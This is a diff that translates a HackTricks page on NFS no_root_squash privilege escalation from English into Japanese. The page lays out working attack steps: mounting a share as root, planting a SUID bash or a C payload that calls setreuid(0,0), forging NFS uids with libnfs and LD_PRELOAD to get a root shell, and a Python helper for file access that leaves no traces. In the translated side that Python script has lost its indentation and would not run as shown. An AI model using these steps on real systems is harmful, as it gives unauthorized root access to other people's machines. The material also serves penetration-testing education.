@@ -1,19 +1,18 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-Read the _ **/etc/exports** _ file, if you find some directory that is configured as **no_root_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.
+_ **/etc/exports** _ ファイルを読み、**no_root_squash** として設定されているディレクトリが見つかった場合、クライアントとしてそのディレクトリに**アクセス**し、ローカルの**root**のようにそのディレクトリの中に**書き込む**ことができます。
 
-**no_root_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.
+**no_root_squash**: このオプションは基本的に、クライアントのrootユーザーにNFSサーバー上のファイルにrootとしてアクセスする権限を与えます。これにより、深刻なセキュリティ上の問題が生じる可能性があります。
 
-**no_all_squash:** This is similar to **no_root_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no_all_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.
+**no_all_squash:** これは**no_root_squash**オプションに似ていますが、**非rootユーザー**に適用されます。例えば、nobodyユーザーとしてシェルを持ち、/etc/exportsファイルを確認し、no_all_squashオプションが存在し、/etc/passwdファイルを確認し、非rootユーザーをエミュレートし、そのユーザーとしてsuidファイルを作成（nfsを使用してマウント）します。その後、nobodyユーザーとしてsuidを実行し、異なるユーザーになります。
 
 # Privilege Escalation
 
 ## Remote Exploit
 
-If you have found this vulnerability, you can exploit it:
+この脆弱性を見つけた場合、次のように悪用できます：
 
-- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
-
+- クライアントマシンでそのディレクトリを**マウント**し、**rootとして**マウントされたフォルダ内に**/bin/bash**バイナリをコピーし、**SUID**権限を与え、被害者マシンからそのbashバイナリを**実行**します。
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -26,9 +25,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-
-- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).
-
+- **クライアントマシンでそのディレクトリをマウントし、** マウントされたフォルダ内に **rootとして** SUID権限を悪用するコンパイル済みペイロードをコピーし、それに **SUID** 権限を与え、**被害者** マシンからそのバイナリを **実行します** (ここにいくつかの[C SUIDペイロード](payloads-to-execute.md#c)があります)。
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -42,61 +39,57 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-
-## Local Exploit
+## ローカルエクスプロイト
 
 > [!NOTE]
-> Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
-> The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit** and you will need to **abuse this trick**.\
-> Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\
-> --_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_--
+> あなたのマシンから被害者のマシンへの**トンネルを作成できる場合、必要なポートをトンネリングしてこの特権昇格を悪用するためにリモートバージョンを使用することができます**。\
+> 次のトリックは、ファイル`/etc/exports`が**IPを示している場合**です。この場合、**リモートエクスプロイトを使用することはできず**、**このトリックを悪用する必要があります**。\
+> エクスプロイトが機能するためのもう一つの要件は、**`/etc/export`内のエクスポートが`insecure`フラグを使用している必要があることです**。\
+> --_`/etc/export`がIPアドレスを示している場合、このトリックが機能するかどうかはわかりません_--
 
-## Basic Information
+## 基本情報
 
-The scenario involves exploiting a mounted NFS share on a local machine, leveraging a flaw in the NFSv3 specification which allows the client to specify its uid/gid, potentially enabling unauthorized access. The exploitation involves using [libnfs](https://github.com/sahlberg/libnfs), a library that allows for the forging of NFS RPC calls.
+このシナリオは、ローカルマシン上のマウントされたNFS共有を悪用し、クライアントがuid/gidを指定できるNFSv3仕様の欠陥を利用して、無許可のアクセスを可能にします。悪用には、NFS RPCコールの偽造を可能にするライブラリ[libnfs](https://github.com/sahlberg/libnfs)を使用します。
 
-### Compiling the Library
+### ライブラリのコンパイル
 
-The library compilation steps might require adjustments based on the kernel version. In this specific case, the fallocate syscalls were commented out. The compilation process involves the following commands:
-
+ライブラリのコンパイル手順は、カーネルバージョンに基づいて調整が必要な場合があります。この特定のケースでは、fallocateシステムコールがコメントアウトされていました。コンパイルプロセスには、次のコマンドが含まれます：
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
+### 攻撃の実行
 
-### Conducting the Exploit
+攻撃は、特権をルートに昇格させ、その後シェルを実行するシンプルなCプログラム（`pwn.c`）を作成することを含みます。プログラムはコンパイルされ、結果として得られたバイナリ（`a.out`）はsuid rootで共有に配置され、RPC呼び出しでuidを偽装するために`ld_nfs.so`を使用します。
 
-The exploit involves creating a simple C program (`pwn.c`) that elevates privileges to root and then executing a shell. The program is compiled, and the resulting binary (`a.out`) is placed on the share with suid root, using `ld_nfs.so` to fake the uid in the RPC calls:
+1. **攻撃コードをコンパイルする:**
 
-1. **Compile the exploit code:**
+```bash
+cat pwn.c
+int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
+gcc pwn.c -o a.out
+```
 
-   ```bash
-   cat pwn.c
-   int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
-   gcc pwn.c -o a.out
-   ```
+2. **攻撃を共有に配置し、uidを偽装してその権限を変更する:**
 
-2. **Place the exploit on the share and modify its permissions by faking the uid:**
+```bash
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
+```
 
-   ```bash
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
-   ```
+3. **攻撃を実行してルート権限を取得する:**
+```bash
+/mnt/share/a.out
+#root
+```
 
-3. **Execute the exploit to gain root privileges:**
-   ```bash
-   /mnt/share/a.out
-   #root
-   ```
+## ボーナス: NFShellによるステルスファイルアクセス
 
-## Bonus: NFShell for Stealthy File Access
-
-Once root access is obtained, to interact with the NFS share without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to match that of the file being accessed, allowing for interaction with files on the share without permission issues:
-
+ルートアクセスが取得されたら、所有権を変更せずにNFS共有と対話するために、Pythonスクリプト（nfsh.py）が使用されます。このスクリプトは、アクセスされるファイルのuidに一致するようにuidを調整し、権限の問題なしに共有上のファイルと対話できるようにします:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -104,23 +97,20 @@ import sys
 import os
 
 def get_file_uid(filepath):
-    try:
-        uid = os.stat(filepath).st_uid
-    except OSError as e:
-        return get_file_uid(os.path.dirname(filepath))
-    return uid
+try:
+uid = os.stat(filepath).st_uid
+except OSError as e:
+return get_file_uid(os.path.dirname(filepath))
+return uid
 
 filepath = sys.argv[-1]
 uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-
-Run like:
-
+実行するには：
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
